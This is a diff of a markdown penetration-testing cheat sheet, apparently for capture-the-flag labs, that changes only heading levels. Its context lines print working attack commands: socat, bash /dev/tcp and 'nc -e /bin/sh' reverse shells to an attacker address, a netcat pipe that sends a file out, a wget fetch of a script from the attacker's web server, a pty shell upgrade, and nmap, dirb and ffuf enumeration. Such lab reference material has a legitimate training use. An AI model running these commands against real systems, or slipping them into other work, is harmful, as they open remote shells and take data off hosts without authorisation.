@@ -30,16 +30,16 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 ```
 
-### With Python
+#### With Python
 
 *Victim:* 
 ```
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
-## Send files
+### Send files
 
-### With netcat
+#### With netcat
 
 *Victim:*
 ```
@@ -51,7 +51,7 @@ cat file.txt | nc -q 0 10.10.10.10 4444
 nc -lvp 4444 > file.txt
 ```
 
-### With web server
+#### With web server
 
 *Kali:*
 ```
@@ -67,29 +67,29 @@ python -m SimpleHTTPServer 8888
 wget http://10.10.10.10:8888/something.sh -O something.sh
 ```
 
-## Reverse shells
+### Reverse shells
 
-### With bash
+#### With bash
 
 ```
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 ```
 
-### With netcat
+#### With netcat
 
 ```
 nc -e /bin/sh 10.10.10.10 4444
 ```
 
-### Listener
+#### Listener
 
 ```
 nc -lvp 4444
 ```
 
-# Enumeration
+## Enumeration
 
-### Nmap
+#### Nmap
 
 TCP Scan:
 
@@ -103,9 +103,9 @@ UDP Scan:
 nmap -sU -sV -p- 10.10.10.77
 ```
 
-## If Web Server
+### If Web Server
 
-### dirb
+#### dirb
 
 Quick directory busting
 
@@ -113,7 +113,7 @@ Quick directory busting
 dirb http://10.10.10.77/
 ```
 
-### fuff
+#### fuff
 
 VHOST Discovery
 
@@ -121,10 +121,10 @@ VHOST Discovery
 fuf -w subdomains-top1million-110000.txt -u https://10.10.10.10/ -H "Host:FUZZ.10.10.10.10"
 ```
 
-# Privilege Escalation
+## Privilege Escalation
 
-# Reverse Engineering
+## Reverse Engineering
 
-# Some Scripts
+## Some Scripts
 
-# References
+## References
